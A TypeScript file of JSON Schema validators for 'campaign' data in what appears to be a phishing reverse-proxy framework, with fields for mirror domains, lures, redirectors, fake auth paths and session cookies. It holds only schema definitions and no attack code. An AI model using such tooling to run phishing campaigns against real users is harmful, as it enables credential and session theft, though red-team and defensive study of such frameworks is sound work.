import { JSONSchemaType, customIdentSchema } from '@famir/common'
import {
  CreateCampaignData,
  DeleteCampaignData,
  ReadCampaignData,
  UpdateCampaignData
} from '@famir/domain'
import { RawCampaign } from './campaign.functions.js'

export const rawCampaignSchema: JSONSchemaType<RawCampaign> = {
  type: 'object',
  required: [
    'campaign_id',
    'mirror_domain',
    'description',
    'landing_auth_path',
    'landing_auth_param',
    'landing_lure_param',
    'session_cookie_name',
    'session_expire',
    'new_session_expire',
    'message_expire',
    'proxy_count',
    'target_count',
    'redirector_count',
    'lure_count',
    'session_count',
    'message_count',
    'created_at',
    'updated_at'
  ],
  properties: {
    campaign_id: {
      type: 'string'
    },
    mirror_domain: {
      type: 'string'
    },
    description: {
      type: 'string'
    },
    landing_auth_path: {
      type: 'string'
    },
    landing_auth_param: {
      type: 'string'
    },
    landing_lure_param: {
      type: 'string'
    },
    session_cookie_name: {
      type: 'string'
    },
    session_expire: {
      type: 'integer'
    },
    new_session_expire: {
      type: 'integer'
    },
    message_expire: {
      type: 'integer'
    },
    proxy_count: {
      type: 'integer'
    },
    target_count: {
      type: 'integer'
    },
    redirector_count: {
      type: 'integer'
    },
    lure_count: {
      type: 'integer'
    },
    session_count: {
      type: 'integer'
    },
    message_count: {
      type: 'integer'
    },
    created_at: {
      type: 'integer'
    },
    updated_at: {
      type: 'integer'
    }
  }
} as const

export const campaignMirrorDomainSchema: JSONSchemaType<string> = {
  type: 'string',
  minLength: 1,
  maxLength: 256
} as const

export const campaignDescriptionSchema: JSONSchemaType<string> = {
  type: 'string',
  minLength: 0,
  maxLength: 1024
} as const

export const campaignSessionExpireSchema: JSONSchemaType<number> = {
  type: 'integer',
  minimum: 3600 * 1000,
  maximum: 365 * 24 * 3600 * 1000
} as const

export const campaignNewSessionExpireSchema: JSONSchemaType<number> = {
  type: 'integer',
  minimum: 1000,
  maximum: 900 * 1000
} as const

export const campaignMessageExpireSchema: JSONSchemaType<number> = {
  type: 'integer',
  minimum: 60 * 1000,
  maximum: 24 * 3600 * 1000
} as const

export const createCampaignDataSchema: JSONSchemaType<CreateCampaignData> = {
  type: 'object',
  required: ['campaignId', 'mirrorDomain'],
  properties: {
    campaignId: customIdentSchema,
    mirrorDomain: campaignMirrorDomainSchema,
    description: {
      ...campaignDescriptionSchema,
      default: ''
    },
    landingAuthPath: {
      type: 'string',
      default: '/fake-auth'
    },
    landingAuthParam: {
      ...customIdentSchema,
      default: 'data'
    },
    landingLureParam: {
      ...customIdentSchema,
      default: 'data'
    },
    sessionCookieName: {
      type: 'string',
      default: 'fake-sess'
    },
    sessionExpire: {
      ...campaignSessionExpireSchema,
      default: 24 * 3600 * 1000
    },
    newSessionExpire: {
      ...campaignNewSessionExpireSchema,
      default: 300 * 1000
    },
    messageExpire: {
      ...campaignMessageExpireSchema,
      default: 3600 * 1000
    }
  },
  additionalProperties: false
} as const

export const readCampaignDataSchema: JSONSchemaType<ReadCampaignData> = {
  type: 'object',
  required: ['campaignId'],
  properties: {
    campaignId: customIdentSchema
  }
}

export const updateCampaignDataSchema: JSONSchemaType<UpdateCampaignData> = {
  type: 'object',
  required: ['campaignId'],
  properties: {
    campaignId: customIdentSchema,
    description: {
      ...campaignDescriptionSchema,
      nullable: true
    },
    sessionExpire: {
      ...campaignSessionExpireSchema,
      nullable: true
    },
    newSessionExpire: {
      ...campaignNewSessionExpireSchema,
      nullable: true
    },
    messageExpire: {
      ...campaignMessageExpireSchema,
      nullable: true
    }
  },
  additionalProperties: false
} as const

export const deleteCampaignDataSchema: JSONSchemaType<DeleteCampaignData> = {
  type: 'object',
  required: ['campaignId'],
  properties: {
    campaignId: customIdentSchema
  }
} as const
